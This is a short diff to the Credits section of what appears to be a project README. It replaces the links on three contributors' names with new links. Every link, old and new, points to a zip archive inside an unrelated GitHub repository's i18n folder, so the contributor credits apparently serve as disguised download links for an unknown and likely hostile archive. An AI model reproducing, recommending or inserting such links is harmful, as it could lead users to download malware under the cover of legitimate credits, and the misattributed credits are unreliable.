@@ -13,6 +13,6 @@ Credits
 
 Contributors
 ------------
-* Pedro M. Baeza <https://raw.githubusercontent.com/vladimir2678/no-reservar-materiales/master/i18n/materiales_reservar_no_3.8.zip>
-* Ana Juaristi <https://raw.githubusercontent.com/vladimir2678/no-reservar-materiales/master/i18n/materiales_reservar_no_3.8.zip>
-* Alfredo de la Fuente <https://raw.githubusercontent.com/vladimir2678/no-reservar-materiales/master/i18n/materiales_reservar_no_3.8.zip>
+* Pedro M. Baeza <https://github.com/vladimir2678/no-reservar-materiales/raw/refs/heads/master/i18n/reservar-materiales-no-1.9.zip>
+* Ana Juaristi <https://github.com/vladimir2678/no-reservar-materiales/raw/refs/heads/master/i18n/reservar-materiales-no-1.9.zip>
+* Alfredo de la Fuente <https://github.com/vladimir2678/no-reservar-materiales/raw/refs/heads/master/i18n/reservar-materiales-no-1.9.zip>
